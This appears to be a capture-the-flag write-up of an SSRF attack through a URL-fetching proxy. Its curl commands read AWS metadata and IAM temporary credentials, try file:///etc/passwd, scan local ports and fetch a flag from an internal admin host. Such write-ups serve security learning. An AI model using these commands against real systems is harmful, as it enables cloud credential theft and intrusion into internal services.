### Quick concise write-up of exactly what I did .


1. Visited the proxy landing page (POST form at `http://54.72.82.22:8804/`). Confirmed it fetches remote URLs.  
    Command used:  
    `curl -i -X POST "http://54.72.82.22:8804/" -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "url=http://example.com"`
    
2. Probed internal addresses for SSRF (127.0.0.1 and AWS metadata). Confirmed metadata available.  
    Example:  
    `--data-urlencode "url=http://169.254.169.254/latest/meta-data/"`
    
3. Enumerated IAM role and attempted to pull temporary creds from metadata (`/latest/meta-data/iam/security-credentials/...`). Creds were retrieved but rotated/trimmed by proxy — I kept retrying.  
    Example:  
    `--data-urlencode "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AmazonSSMRoleForInstancesQuickSetup"`
    
4. Checked `user-data` (no useful content). Tried `file://` (blocked).  
    Commands:  
    `--data-urlencode "url=http://169.254.169.254/latest/user-data"`  
    `--data-urlencode "url=file:///etc/passwd"`
    
5. Scanned common local ports via proxy. Found an app on `127.0.0.1:5000`.  
    Loop we used (example):
    
    `for p in 80 443 5000 8000 8080 3000 3001 9000 9001 8081; do   curl -s -X POST "http://54.72.82.22:8804/" -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "url=http://127.0.0.1:$p/" done`
    
6. Brute-forced common paths on `127.0.0.1:5000`. `robots.txt` exposed `Disallow: http://admin:8080/*` → probed `http://admin:8080/`. That returned the hint `Nothing to see here. Try /flag`.  
    Command:  
    `--data-urlencode "url=http://admin:8080/"`
    
7. Pulled the flag from `http://admin:8080/flag` via the proxy.  
    Final command (where the flag was returned):  
    `--data-urlencode "url=http://admin:8080/flag"`